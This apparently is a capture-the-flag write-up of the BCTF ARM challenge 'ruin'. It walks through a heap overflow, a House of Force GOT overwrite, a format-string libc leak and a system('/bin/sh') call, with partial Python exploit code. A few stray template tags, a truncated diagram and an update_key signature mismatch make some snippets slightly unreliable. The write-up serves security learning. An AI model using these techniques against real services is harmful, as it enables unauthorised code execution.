This is an ARM 32b exploitation challenge part of the [BCTF](http://bctf.cn/) competition,
which I've enjoyed playing with the team TheGoonies. During the competition,
only 18 teams (out of the 500+) were able to solve it. All props to them!


The technique I used to solve it is a bit twisted but it works fine and
reliably. So hang on ☺

Since the target is an ARM binary, I heavily relied on the tool I wrote,
[GDB-GEF](https://github.com/hugsy/gef) to help me in the exploitation process.


### Vulnerability ###

`ruin` is an ARM ELF binary that allows you to store "securely" messages in
memory, acting like a safe.

The real `main()` function starts at 0x00008A88 and starts by allocating on the
heap (`malloc()`) an 8-byte chunk, then jump
to a function at 0x89CC (which I've called `get_key_security`) to authenticate
and unlock the safe.
<!--more-->
![get-key-security](https://i.imgur.com/WhZ5QLW.png)

The `strncmp()` call trivially shows the expected initial key, in this case
`security`. Once the safe is unlocked, 4 different operations are possible:

   1. Update the key (function @0x000087D0, which I will call `update_key()` in
   the rest of this write-up): this function will allocate a
   16-byte `key` chunk, and copy the content from stdin.
   1. Edit a secret stored (function @0x0000884C,  which I will call
   `edit_secret()`): if the `secret` chunk is
   not allocated, then the function invokes `malloc(8)`. Then it performs an
   `fgets()` to store 24 bytes from stdin (us!) into this buffer. We immediately
   spot a heap overflow here.
![heap-ovf](https://i.imgur.com/sTpxqBT.png)
   1. Sign the secret with your name (function @0x000088B8, `sign_name()`): if the `name` chunk
   is not NULL (i.e. already allocated), then the function returns. Otherwise,
   it calls the `read_int()` function at 0x0875C which prompts the user for the
   name size with `atoi()`, checks it's higher than 0x20 bytes, if
   so, `malloc(size)` and reads its contents from stdin using `fgets()`.

.text:0000879C                 STR     R0, [R11,#result]
{% endhighlight %}
   1. Leave (function @0x00008978, `leave()`): invokes `free()` to de-allocate the 3
   buffers allocated by the steps above, and then exit cleanly.


We have 2 vulnerabilities here:

   - The heap overflow explained in the `edit_secret()` function
   - The integer overflow from the `sign_name()` function, since the `atoi()`
   call is not checked for negative integer before being compared. This allows
   us to control the size of the next `malloc()` call (the one used to store the
   name).




### Exploitation ###

#### The House of Force ####

With those 2 vulnerabilities, and the fact that we can control another chunk to
be allocated (through the `update_key()` function), we have now a perfect
scenario for an **"House of Force"** heap exploitation. If you need a reminder, I
recommend you read [this](http://phrack.org/issues/66/10.html) and
[this](https://sploitfun.wordpress.com/2015/03/04/heap-overflow-using-malloc-maleficarum/).

The idea behind this attack (which still works against recent libc heap
allocator), is to be able to control the size of one chunk. By making the value
of the size for this new chunk very big, it will allow us to overflow the
address space, and make the chunk upper bound finish in an "interesting" writable
location, for example, the
[Global Offset Table](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html).

When we reach the "main" loop, the `secret` chunk (8 bytes) is already
allocated. So we can use the `malloc(name_size)` to create a chunk that will
overflow the address space and end in the GOT, which starts at 0x00010F48.

                                 | free@got   |    so we make malloc(name_length)
                    GOT start <--+------------+    finish at @target - 8 (8 bytes for
                                 |            |    header). The next malloc(key) will
                                 |            |    overwrite the GOT with controlled
                                 |            |    data.
                     0x00000000  .            .
{% endhighlight %}

So what size do we need for the *name* chunk? We know that the *key* chunk can
write 16 bytes, so 4 DWORD. And also, the target address must be aligned to 2
DWORD (8 bytes - because it is an ARM 32 bits).

![got](https://i.imgur.com/DQjJxu6.png)



#### Leaking heap memory ####

But we have a problem, we don't know where the heap pages are located in the memory
layout. Lucky for us, the "authentication" function (`get_key_security()`) uses
`fread()`, which unlike
`fgets()` does not append a NULL byte at the end of the string.

![auth-func](https://i.imgur.com/Wml7uwI.png)

This allows to leak addresses some precious bytes from the heap, doing something like this:

{% highlight python %}
def auth(s):
    s.read_until("please input your 8-bit key:")
    s.write("A"*8)
    leak = s.read_until("\n")
    leak = leak.replace(" is wrong, try again!\n", '')
    leak = leak.replace('A'*8, '')
    if len(leak)<4: leak += "\x00"*(4-len(leak))
    leak = i_u(leak)
    s.read_until("please input your 8-bit key:")
    s.write("security")
    return leak
{% endhighlight %}


#### Controlling $pc ####

From the heap memory leak, we know the address of the `secret` chunk, which
means that the `name` chunk headers will be located exactly 8 bytes after.

{% highlight bash %}
     +----------+-----------+...+----------+
     |  secret  |  name     |   | key      |
     +----------+-----------+...+----------+
{% endhighlight %}

So we must set the length for the `name` chunk dynamically by using the
`update_key()` function:

{% highlight python %}
ATOI_GOT   = 0x00010F80 - 2*8
[...]
def sign_name(s, addr):
    select_menu_entry(s, 3)
    new_sz = -addr + ATOI_GOT
    name = "JUNK"*8
    ok("malloc(name) with size=%#x" % new_sz)
    s.read_until("please input your name length:")
    s.write("%d\n" % new_sz)
    s.read_until("enter your name:")
    s.write(name)
    return

secret_addr    = leak - 8
name_addr      = secret_addr + 8 + 8

sign_name(s, name_addr)
{% endhighlight %}

The heap is now set dynamically with the correct offset. The next call to
`malloc()` will overwrite the GOT entry of `atoi@got` with our data!

{% highlight python %}
def update_key(s):
    ok("malloc(key)")
    select_menu_entry(s, 1)
    key = ""
    key+= "\xbb"*4              # atoi@got will be overwritten with this value
    key+= "B"*4 + "C"*4 + "D"*4
    s.read_until("enter the new 16-bit key:")
    s.write(key)
    s.read_until("the key is updated!")
    return

def leave(s):
    ok("Leaving - and triggering atoi@got")
    select_menu_entry(s, 4)
    return
{% endhighlight %}

Which produces the following result in `gef`:
![control-pc](https://i.imgur.com/UdmAg6N.png)

Bingo! We control the execution flow! Good! But now where do we go?

The binary is dynamically linked, and does not contains any gadget that would
allow us to call directly `execve` so we need a leak from the libc.


#### Using function indirection to leak memory using printf ####

I'm not sure if this is the best way to do, but I like this approach: the idea
is that, when you can overwrite the GOT, point an "interesting" function of the
control flow to `printf@plt`. This way, if you can control the parameter of this
call, you can use a regular format string attack to read/write everywhere!!

The `read_int()` (at 0x875c) offers a perfect exploitation case:
![read-int-ida](https://i.imgur.com/81p3djs.png)

`fgets` at 0x878c allows us to provide 32 bytes in the stack, which will be
given to `atoi` as a parameter. So if we overwrite `atoi@got` with the address
of `printf@plt`, we have a good case for a format string attack.

So using the technique above, we can overwrite `atoi@got` with the address of
`printf` in the [PLT](https://en.wikipedia.org/wiki/Dynamic_linker):

{% highlight bash %}
.plt:00008594 ; int printf(const char *format, ...)
.plt:00008594 printf                                  ; CODE XREF: print_banner+58
.plt:00008594                                         ; update_key+38 ...
.plt:00008594                 ADR     R12, 0x859C
.plt:00008598                 ADD     R12, R12, #0x8000
.plt:0000859C                 LDR     PC, [R12,#(printf_ptr - 0x1059C)]! ; __imp_printf
{% endhighlight %}

{% highlight python %}
    update_key(s, PRINTF_IMPORT, False)
    ok("atoi@got: %#x -> %#x" % (ATOI_GOT, PRINTF_IMPORT))
{% endhighlight %}

So now every time the control flow will hit the `atoi()` function, the `printf()`
stub will be executed, and we will receive the argument from the socket! So
every time the banner will prompt for a choice (1-4), the buffer we send will be
the argument to `printf()`.


#### Triggering the exploit ####

By leaking the memory, we find that an address to the libc can be found (at
least) at the offset 21:
![libc-leak](https://i.imgur.com/Q5UpCbc.png)

On the C library I tested, the `system()` function was located at an offset of
0x37524 from the base. So now, we know the address of `system()`:
{% highlight python %}
    while True:
        s.write("data> %21$#.8x\n")
        leak = s.read_until("\n")
        if "data> " in leak:
            break

    libc_leak = int(leak.strip().split()[-1], 16)
    libc_base = libc_leak - 0x16d24
    libc_system = libc_base + 0x37524

    ok("Got libc_leak: %#x" % libc_leak)
    ok("Got libc_base: %#x" % libc_base)
    ok("Got libc_system: %#x" % libc_system)
{% endhighlight %}

And to complete the exploitation, all we must do is overwrite again `atoi@got`
with the address of `system()`, and when `fgets()` will be triggered, simply
enter the command we want to execute, in this case `/bin/sh` will do:
{% highlight python %}
    update_key(s, libc_system, True)
    ok("atoi@got: %#x -> %#x" % (ATOI_GOT, libc_system))

    s.write("/bin/sh"+'\x00'*10)
    s.write("\n")
{% endhighlight %}

The exploit is complete, we can run it:

Peace out ✌
